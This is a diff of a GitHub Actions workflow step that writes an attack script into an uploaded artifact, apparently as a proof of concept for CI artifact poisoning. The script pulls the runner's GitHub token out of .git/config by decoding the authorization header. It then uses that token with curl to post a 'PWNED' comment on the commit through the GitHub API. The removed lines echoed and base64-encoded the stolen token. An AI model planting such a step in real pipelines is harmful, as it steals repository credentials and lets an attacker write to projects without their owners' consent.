@@ -13,22 +13,10 @@ jobs:
     steps:
       - run: |
           cat <<EOT >> myartifact
-          ls
-          export GITHUB_TOKEN=$(cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d)
-          cat $GITHUB_WORKSPACE/.git/config
-          cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION
-          cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2
-          cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3
-          cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3
-          cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d
-          
-          echo $GITHUB_TOKEN
-          echo $GITHUB_TOKEN | base64
-          
+          export GITHUB_TOKEN=$(cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d)    
           curl -X POST -H "Authorization: Token $GITHUB_TOKEN" \
           -d '{"body": "PWNED"}' \
-          https://api.github.com/$GITHUB_REPOSITORY/commits/$GITHUB_SHA/comments
-          pwd
+          https://api.github.com/repos/$GITHUB_REPOSITORY/commits/$GITHUB_SHA/comments
           EOT
 
       - name: Upload environment variables artifact
